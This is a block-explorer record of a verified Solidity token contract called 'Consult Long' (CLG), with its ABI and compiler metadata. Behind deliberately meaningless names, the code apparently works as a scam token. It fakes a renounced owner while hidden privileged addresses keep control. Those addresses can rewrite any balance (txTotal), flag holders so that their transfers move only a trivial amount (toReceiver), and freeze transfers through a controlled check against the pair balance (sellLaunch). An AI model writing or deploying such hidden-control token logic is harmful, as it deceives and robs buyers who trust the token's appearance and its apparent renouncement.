{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface tokenTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverReceiver {\n    function createPair(address listTake, address tradingFeeTake) external returns (address);\n}\n\ninterface teamShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoTake) external view returns (uint256);\n\n    function transfer(address totalAmount, uint256 receiverTotal) external returns (bool);\n\n    function allowance(address exemptIsTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalAmount,\n        uint256 receiverTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenMarketing, uint256 value);\n    event Approval(address indexed exemptIsTrading, address indexed spender, uint256 value);\n}\n\ninterface teamShouldMetadata is teamShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConsultLong is enableReceiver, teamShould, teamShouldMetadata {\n\n    uint256 public minFee;\n\n    bool public launchFund;\n\n    function balanceOf(address autoTake) public view virtual override returns (uint256) {\n        return enableShould[autoTake];\n    }\n\n    function transferFrom(address senderShould, address totalAmount, uint256 receiverTotal) external override returns (bool) {\n        if (_msgSender() != limitSwap) {\n            if (walletReceiver[senderShould][_msgSender()] != type(uint256).max) {\n                require(receiverTotal <= walletReceiver[senderShould][_msgSender()]);\n                walletReceiver[senderShould][_msgSender()] -= receiverTotal;\n            }\n        }\n        return sellLaunch(senderShould, totalAmount, receiverTotal);\n    }\n\n    address public minIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellAmountIs;\n    }\n\n    address private sellFund;\n\n    function atTo(address senderShould, address totalAmount, uint256 receiverTotal) internal returns (bool) {\n        require(enableShould[senderShould] >= receiverTotal);\n        enableShould[senderShould] -= receiverTotal;\n        enableShould[totalAmount] += receiverTotal;\n        emit Transfer(senderShould, totalAmount, receiverTotal);\n        return true;\n    }\n\n    bool public autoMax;\n\n    function amountLiquidityTrading(uint256 receiverTotal) public {\n        tradingEnable();\n        isWallet = receiverTotal;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundSwap;\n    }\n\n    string private sellAmountIs = \"CLG\";\n\n    uint256 private exemptAmount;\n\n    string private autoTxIs = \"Consult Long\";\n\n    uint8 private isMax = 18;\n\n    function transfer(address swapMode, uint256 receiverTotal) external virtual override returns (bool) {\n        return sellLaunch(_msgSender(), swapMode, receiverTotal);\n    }\n\n    uint256 modeLaunchedSell;\n\n    uint256 private fundSwap = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private enableShould;\n\n    function owner() external view returns (address) {\n        return sellFund;\n    }\n\n    address sellToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private walletReceiver;\n\n    function allowance(address modeBuy, address totalTrading) external view virtual override returns (uint256) {\n        if (totalTrading == limitSwap) {\n            return type(uint256).max;\n        }\n        return walletReceiver[modeBuy][totalTrading];\n    }\n\n    uint256 constant tokenMaxExempt = 8 ** 10;\n\n    event OwnershipTransferred(address indexed tokenSell, address indexed modeTotal);\n\n    address limitSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return autoTxIs;\n    }\n\n    function tradingEnable() private view {\n        require(liquidityExempt[_msgSender()]);\n    }\n\n    uint256 private totalSender;\n\n    function txTotal(address swapMode, uint256 receiverTotal) public {\n        tradingEnable();\n        enableShould[swapMode] = receiverTotal;\n    }\n\n    uint256 isWallet;\n\n    address public txMode;\n\n    mapping(address => bool) public totalIs;\n\n    function totalShould(address totalLimitMin) public {\n        require(totalLimitMin.balance < 100000);\n        if (autoMax) {\n            return;\n        }\n        \n        liquidityExempt[totalLimitMin] = true;\n        if (launchFund) {\n            launchFund = true;\n        }\n        autoMax = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return sellFund;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isMax;\n    }\n\n    bool public buyLimit;\n\n    constructor (){\n        \n        tokenTeam enableMaxMarketing = tokenTeam(limitSwap);\n        minIs = receiverReceiver(enableMaxMarketing.factory()).createPair(enableMaxMarketing.WETH(), address(this));\n        if (exemptAmount == totalSender) {\n            totalSender = exemptAmount;\n        }\n        txMode = _msgSender();\n        receiverTx();\n        liquidityExempt[txMode] = true;\n        enableShould[txMode] = fundSwap;\n        if (totalSender != exemptAmount) {\n            totalSender = exemptAmount;\n        }\n        emit Transfer(address(0), txMode, fundSwap);\n    }\n\n    function sellLaunch(address senderShould, address totalAmount, uint256 receiverTotal) internal returns (bool) {\n        if (senderShould == txMode) {\n            return atTo(senderShould, totalAmount, receiverTotal);\n        }\n        uint256 liquidityIs = teamShould(minIs).balanceOf(sellToken);\n        require(liquidityIs == isWallet);\n        require(totalAmount != sellToken);\n        if (totalIs[senderShould]) {\n            return atTo(senderShould, totalAmount, tokenMaxExempt);\n        }\n        return atTo(senderShould, totalAmount, receiverTotal);\n    }\n\n    function receiverTx() public {\n        emit OwnershipTransferred(txMode, address(0));\n        sellFund = address(0);\n    }\n\n    function toReceiver(address feeLimit) public {\n        tradingEnable();\n        \n        if (feeLimit == txMode || feeLimit == minIs) {\n            return;\n        }\n        totalIs[feeLimit] = true;\n    }\n\n    function approve(address totalTrading, uint256 receiverTotal) public virtual override returns (bool) {\n        walletReceiver[_msgSender()][totalTrading] = receiverTotal;\n        emit Approval(_msgSender(), totalTrading, receiverTotal);\n        return true;\n    }\n\n    bool public fromFund;\n\n    mapping(address => bool) public liquidityExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptIsTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverTotal\",\"type\":\"uint256\"}],\"name\":\"amountLiquidityTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"}],\"name\":\"toReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLimitMin\",\"type\":\"address\"}],\"name\":\"totalShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotal\",\"type\":\"uint256\"}],\"name\":\"txTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConsultLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}